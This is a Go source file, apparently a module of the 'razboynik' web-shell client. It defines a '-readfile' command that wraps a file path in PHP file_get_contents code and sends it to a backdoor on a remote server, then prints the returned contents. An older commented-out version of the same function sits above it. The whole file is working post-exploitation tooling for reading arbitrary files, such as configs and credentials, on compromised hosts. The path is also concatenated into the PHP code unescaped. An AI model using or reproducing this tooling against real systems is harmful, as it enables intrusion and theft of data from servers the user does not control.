// package phpmodule

// import (
// 	"errors"

// 	"github.com/eatbytes/razboy"
// 	"github.com/eatbytes/razboy/adapter/phpadapter"
// 	"github.com/eatbytes/razboynik/services/kernel"
// )

// func ReadFile(kc *kernel.KernelCmd, c *razboy.Config) (*kernel.KernelCmd, error) {
// 	var (
// 		request *razboy.REQUEST
// 		action  string
// 		file    string
// 		err     error
// 	)

// 	file = kc.GetArrItem(1)

// 	if file == "" {
// 		return kc, errors.New("You should give the path of the file")
// 	}

// 	action = phpadapter.CreateReadFile(file) + phpadapter.CreateAnswer(c.Method, c.Parameter)
// 	request = razboy.CreateRequest(action, c)

// 	_, err = kc.Send(request)

// 	return kc, err
// }

package phpmodule

import (
	"errors"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
	"github.com/eatbytes/razboynik/services/lister"
)

type Readfilecmd struct{}

func (read *Readfilecmd) Exec(kl *kernel.KernelLine, config *razboy.Config) (kernel.KernelCommand, error) {
	var (
		action   string
		file     string
		args     []string
		err      error
		request  *razboy.REQUEST
		response *razboy.RESPONSE
	)

	args = kl.GetArr()

	if len(args) < 1 {
		return read, errors.New("You should give the path of the file to read")
	}

	file = args[0]

	action = "$r=file_get_contents('" + file + "');" + razboy.CreateAnswer(config.Method, config.Parameter)
	request = razboy.CreateRequest(action, config)
	response, err = razboy.Send(request)

	if err != nil {
		return read, err
	}

	kl.WriteSuccess(response.GetResult())

	return read, nil
}

func (read *Readfilecmd) GetName() string {
	return "-readfile"
}

func (read *Readfilecmd) GetCompleter() (kernel.CompleteFunction, bool) {
	return lister.RemotePHP, true
}

func (read *Readfilecmd) GetResult() []byte {
	return make([]byte, 0)
}

func (read *Readfilecmd) GetResultStr() string {
	return ""
}
